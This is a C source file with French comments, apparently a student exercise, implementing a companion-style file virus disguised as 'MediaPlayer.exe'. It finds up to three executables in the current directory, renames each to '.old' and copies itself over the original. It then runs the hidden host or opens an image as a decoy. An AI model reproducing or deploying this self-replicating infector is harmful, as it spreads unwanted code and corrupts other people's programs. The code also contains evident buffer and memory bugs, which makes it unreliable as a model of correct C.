#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

bool dejaInfecte(char* nomFichier)
{
	char * extension = ".old";
	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
		return true;
	}else{
		DIR *rep = opendir("."); 
		struct dirent *lecture;
		while ((lecture = readdir(rep))) { //On verifie dans le repertoire, s'il y a déjà un .old 
			if((strcmp(lecture->d_name,nomFichier) == 0) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
}

char** searchFiles(char* exeption)
{
	char** files = malloc(3*sizeof(char*));
	int cpt=0;
	DIR *rep = opendir("."); //Repertoire couranthttps://stackoverflow.com/questions/17766754/how-to-compare-a-char
	struct stat buf;
	struct dirent *lecture;
	printf("fichier(s) executable(s) :\n");
	while ((lecture = readdir(rep))) { //Contenu du repertoire
		stat(lecture->d_name,&buf);
		char exeptionFile[strlen(lecture->d_name)+3];
		strcpy(exeptionFile,"./");
		strcat(exeptionFile,lecture->d_name);
		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
		{ //si fichier régu && executable
			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=0 && !dejaInfecte(lecture->d_name)) 
			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
				printf("  - %s\n", lecture->d_name);
				files[cpt] = lecture->d_name;
				cpt+=1;
			}
		}
        }
	closedir(rep);
	return files;	
}

void infecte(char** files, char *arg)
{
	for(int i=0;i<3;i+=1){
		if(files[i]!=NULL){
			char x[strlen(files[i])+strlen(".old")+1];
			char currentFile[strlen(files[i])+1];
			strcpy(currentFile,files[i]);
			strcpy(x,files[i]);
			strcat(x,".old");
			rename(files[i],x);
			char copyFile[500]="";
			strcat(copyFile,"cp ");
			strcat(copyFile,arg);
			strcat(copyFile," ");
			strcat(copyFile,files[i]);
			system(copyFile);
		}
	}
}

void execution(char *arg){
	if(strcmp(arg,"./MediaPlayer.exe")!=0)
	{
		char progExec[strlen(arg+5)];//prog.old
		strcpy(progExec,arg);
		strcat(progExec,".old");
		system(progExec);
	}else{
		char uneimage[256] = "xdg-open ./";
		DIR *d;
		struct dirent *dir;
		d = opendir(".");
		if (d) {
			while ((dir = readdir(d)) != NULL) {
				if(strstr(dir->d_name, ".jpg") || strstr(dir->d_name, ".jpeg") || strstr(dir->d_name, ".png")){
					strcat(uneimage, dir->d_name);
					system(uneimage);
					break;
				}
			}
			closedir(d);
		}
	}
}

int main(int argc, char *argv[])
{
	char exeptionFile[strlen(argv[0])+1];
	strcpy(exeptionFile,argv[0]);
	char** f = searchFiles(exeptionFile);
	if(f[0]!=NULL)
	infecte(f, argv[0]);
	execution(argv[0]);
	return 0;
}
